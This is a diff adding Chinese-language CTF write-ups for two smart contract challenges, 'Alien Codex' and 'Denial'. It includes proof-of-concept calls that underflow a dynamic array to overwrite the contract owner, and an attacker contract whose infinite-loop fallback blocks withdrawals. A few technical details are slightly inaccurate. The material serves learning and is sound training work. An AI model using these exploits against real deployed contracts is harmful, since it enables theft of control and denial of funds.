@@ -1106,3 +1106,147 @@ await contract.setSolver(txn.contractAddress)
 参考资料：
 - [Learn EVM in depth #2. Executing the bytecode step by step in the deployment of a contract.](https://medium.com/coinmonks/learn-evm-in-depth-2-executing-the-bytecode-step-by-step-in-the-deployment-of-a-contract-270a6335df75)
 - [https://www.evm.codes/playground](https://www.evm.codes/playground)
+
+# Alien Codex
+- 本题参考资料：[ABI docs](https://docs.soliditylang.org/en/v0.4.21/abi-spec.html)
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.5.0;
+
+import "../helpers/Ownable-05.sol";
+
+contract AlienCodex is Ownable {
+    bool public contact;
+    bytes32[] public codex;
+
+    modifier contacted() {
+        assert(contact);
+        _;
+    }
+
+    function makeContact() public {
+        contact = true;
+    }
+
+    function record(bytes32 _content) public contacted {
+        codex.push(_content);
+    }
+
+    function retract() public contacted {
+        codex.length--;
+    }
+
+    function revise(uint256 i, bytes32 _content) public contacted {
+        codex[i] = _content;
+    }
+}
+```
+目标是夺取合约控制权（即将 owner 状态变量设置为我们的地址，这个变量来自继承的 Ownable 合约）。在 Solidity 0.5.0 之前，动态数组的长度是可修改的，codex.length-- 可以将数组长度减少。当数组长度减少到零以下时，会发生什么？在 Solidity 0.5.0 之前，codex.length-- 可能导致数组长度下溢，从而变成一个非常大的数。
+
+Solidity 中的存储是连续的，数组的元素紧跟在数组的起始位置之后。如果我们能够计算出存储槽的位置，就有可能覆盖其他状态变量。
+
+- Solidity 存储布局： 在 Solidity 中，状态变量在存储中的布局遵循以下原则：
+    - 每个状态变量存储在256位（32字节）的存储槽（slot）中。状态变量按照声明的顺序存储。 继承的合约优先。
+    - 如果多个状态变量的大小加起来不超过32字节，它们可以打包存储在同一个slot中。
+    - 动态大小的类型（如数组、映射）会占用单独的slot来存储指向其数据的指针。
+    - 动态数组（如 bytes32[]）的存储方式：数组的长度存储在一个槽中，其位置通过 keccak256(数组槽位置) 计算得到。数组的元素从计算得到的槽位置开始顺序存储。
+```
+array[0] = keccak256(uint256(slot)) + 0
+array[1] = keccak256(uint256(slot)) + 1
+...
+array[MAX] = keccak256(uint256(slot)) + 2 ^ 256
+```
+
+```js
+await web3.eth.getStorageAt("0x46bd82aBEe5DE33DadcE904DF892cdD1789EF2e7",0)
+'0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11'
+await web3.eth.getStorageAt("0x46bd82aBEe5DE33DadcE904DF892cdD1789EF2e7",1)
+'0x0000000000000000000000000000000000000000000000000000000000000000'
+await web3.eth.getStorageAt("0x46bd82aBEe5DE33DadcE904DF892cdD1789EF2e7",2)
+'0x0000000000000000000000000000000000000000000000000000000000000000'
+```
+ownable 里有一个 owner 变量（address 类型，20 bytes）。然后 AlienCodex 里有俩变量（bool，bytes32[]）。根据上面的介绍，显然 address、bool在slot0，动态数组在slot1。这里我们还可以验证一下：
+```js
+await web3.eth.getStorageAt("0x46bd82aBEe5DE33DadcE904DF892cdD1789EF2e7",0)
+'0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11'
+                          ⬆️ 这里变成了1 0bc04aa6aac163a6b3667636d798fa053d43bd11 刚好40个chars，20bytes
+                        bool, address
+```
+证明我们分析的正确性。 所以 codex 数组的起始槽位置为 1。数组元素的存储起始位置为 keccak256(1)。可以通过计算覆盖到其他存储槽。
+已知 array[0] = keccak256(uint256(1)) + 0，我们想要访问 slot 0，array[x] = 0 = keccak256(uint256(1)) + x
+=> x = 0 - keccak256(uint256(1)) =  2^256 - keccak256(uint256(1)) = 2^256-1-keccak256(uint256(1))+1
+
+```solidity
+uint256 public index = uint256(0) - uint256(keccak256(abi.encodePacked(uint256(1)))); // 需要用低版本的 solidity
+// or
+uint256 public index2 = (2**256 - 1) - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
+// 35707666377435648211887908874984608119992236509074197713628505308453184860938
+// 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
+```
+但直接 revise player 地址也会有问题，因为 bytes[] 是大端序，这个数据会写到 0x前半截，而我们知道存储布局 owner 在slot0 0x....address的尾部。所以需要对player填充前导0。
+
+POC:
+```solidity
+await contract.retract() // codex underflow
+await contract.revise("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a", web3.utils.padLeft(player, 64))
+```
+
+# Denial
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Denial {
+    address public partner; // withdrawal partner - pay the gas, split the withdraw
+    address public constant owner = address(0xA9E);
+    uint256 timeLastWithdrawn;
+    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances
+
+    function setWithdrawPartner(address _partner) public {
+        partner = _partner;
+    }
+
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint256 amountToSend = address(this).balance / 100;
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+        partner.call{value: amountToSend}("");
+        payable(owner).transfer(amountToSend);
+        // keep track of last withdrawal time
+        timeLastWithdrawn = block.timestamp;
+        withdrawPartnerBalances[partner] += amountToSend;
+    }
+
+    // allow deposit of funds
+    receive() external payable {}
+
+    // convenience function
+    function contractBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+```
+题目要求是：阻止合约的所有者在调用 withdraw() 函数时提取资金，条件是合约仍然有余额并且调用时的 gas 消耗不超过 1M gas。这是一个经典的 Dos(denial of service) 问题。
+
+题目提供的合约是一个简单的钱包合约，主要功能是将合约中的资金按比例（1%）分发给 partner（合伙人）和合约的所有者 owner。主要流程如下：
+1. 合约拥有者可以调用 setWithdrawPartner() 设置合伙人地址。
+2. 调用 withdraw() 函数时，合约中的 1% 余额会分别发给 partner 和 owner，即 partner 得到一部分资金，owner 得到另一部分。
+3. withdraw() 函数中首先使用 partner.call{value: amountToSend}("") 将资金发送给合伙人，紧接着调用 payable(owner).transfer(amountToSend) 将资金发送给合约的 owner。
+
+题目要求是通过某种方式阻止合约 owner 从合约中提取资金，但合约中的资金仍然存在。这意味着我们需要在 withdraw() 函数中让 payable(owner).transfer() 无法成功完成。可以通过利用 partner.call{value: amountToSend}("") 来消耗大量的gas，使得 payable(owner).transfer() 没有足够的gas执行。 call() 方法没有限制 gas 的使用，允许消耗大量的gas，而 transfer() 默认只能使用 2300 gas。如果 partner.call() 消耗了足够多的 gas，payable(owner).transfer() 就会因为gas不足而失败。将我们自己的合约设为 partner，在我们的合约中设计一种方法，消耗大量的gas，从而阻止 owner 提取资金。
+
+POC:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Attack {
+    fallback() external payable {
+        while(true){}
+    }
+}
+```
+```js
+await contract.setWithdrawPartner("0x096fb29B3474Fe58D8da00d52EAB27eF9b75Bb02")
+```
